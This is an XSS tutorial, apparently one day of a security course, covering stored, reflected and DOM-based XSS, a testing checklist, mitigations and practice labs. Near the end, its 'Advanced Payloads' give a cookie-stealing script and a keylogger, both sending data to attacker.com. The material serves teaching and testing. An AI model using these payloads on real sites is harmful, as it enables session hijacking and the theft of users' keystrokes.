# Day 3: Cross-Site Scripting (XSS)

## 📖 Overview  
Cross-Site Scripting (XSS) is a widespread web security vulnerability that enables attackers to inject malicious scripts into trusted websites. The scripts run in the context of the victim's browser, allowing attackers to steal sensitive data, hijack user sessions, or deface websites.

---

## 🚩 Key Concepts  

### **What is XSS?**  
XSS occurs when:  
- An application includes untrusted user input in its output.  
- Input is not properly sanitized or escaped.  
- Malicious scripts execute in the victim's browser.  

### **Types of XSS**  
1. **Stored XSS**: Malicious scripts are permanently stored on the server (e.g., in a database or logs).  
2. **Reflected XSS**: Malicious scripts are reflected back to the user via URL or HTTP parameters.  
3. **DOM-based XSS**: Client-side scripts process untrusted user input directly in the browser's DOM.  

---

## 🔍 **How to Identify XSS Vulnerabilities**  

### **Common Injection Points**  
- Input fields (e.g., search boxes, forms).  
- URL parameters (e.g., `?q=<script>`).  
- HTTP headers (e.g., User-Agent, Referer).  
- Dynamic content rendered on the page.  

---

## 🛠️ **Exploitation Steps**  

### **Example 1: Stored XSS**  
- **Injection Point**: Comment or feedback forms.  
- **Payload**:  
  ```html
  <script>alert('XSS Vulnerability!');</script>
  ```  
- **Impact**:  
  - Script executes every time a user views the injected content.

### **Example 2: Reflected XSS**  
- **Injection Point**: Search or query parameters in the URL.  
- **Payload**:  
  ```html
  <script>alert(document.cookie);</script>
  ```  
- **Example Request**:  
  ```http
  http://example.com/search?q=<script>alert('XSS');</script>
  ```  

### **Example 3: DOM-based XSS**  
- **Injection Point**: JavaScript rendering dynamic content in the DOM.  
- **Payload**:  
  ```html
  <img src=x onerror=alert('DOM-XSS')>
  ```  
- **Exploitation**: Directly inject into client-side code manipulating the DOM.

---

## **XSS Vulnerability Checklist**  

### **1. Reconnaissance**  
- [ ] Identify user input reflected or stored in responses.  
- [ ] Examine client-side JavaScript for unsanitized DOM manipulations.  

### **2. Testing**  
- [ ] Test for HTML/JavaScript injection with payloads:  
  - `<script>alert('XSS');</script>`  
  - `"><img src=x onerror=alert('XSS')>`  
  - `'><svg onload=alert('XSS')>`  
- [ ] Observe whether the payload is rendered or sanitized.  

### **3. Verification**  
- [ ] Confirm script execution in the browser.  
- [ ] Analyze potential impact (e.g., data theft, session hijacking).

---

## 🔒 **Mitigation Strategies**  

1. **Input Validation**: Allow only expected formats for input.  
2. **Output Encoding**: Encode data before rendering to prevent execution:  
   - Use libraries like `htmlspecialchars()` (PHP) or `ESAPI.encodeForHTML()` (Java).  
3. **Content Security Policy (CSP)**: Restrict the execution of scripts to trusted sources.  
4. **Sanitize Inputs**: Use sanitization libraries to clean user inputs.  
5. **Avoid Inline Scripts**: Place scripts in external files and avoid `eval()` or similar functions.  
6. **HTTPOnly Cookies**: Prevent attackers from accessing cookies via JavaScript.  

---

## 💻 **Hands-on Practice**  
- Test XSS vulnerabilities on the following platforms:  
  - [XSS Game by Google](https://xss-game.appspot.com/)  
  - [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)  
  - [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)  

---

## **XSS Payloads for Testing**  
### **Basic Payloads**  
- `<script>alert('XSS');</script>`  
- `"><img src=x onerror=alert(1)>`  

### **Advanced Payloads**  
- Exfiltrate cookies:  
  ```html
  <script>fetch('http://attacker.com/log?cookie='+document.cookie)</script>
  ```  
- Keylogger:  
  ```html
  <script>document.onkeypress = function(e) { fetch('http://attacker.com/log?key='+e.key); }</script>
  ```  

---

## 🛠️ **Resources**  
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)  
- [PortSwigger’s XSS Labs](https://portswigger.net/web-security/cross-site-scripting)  
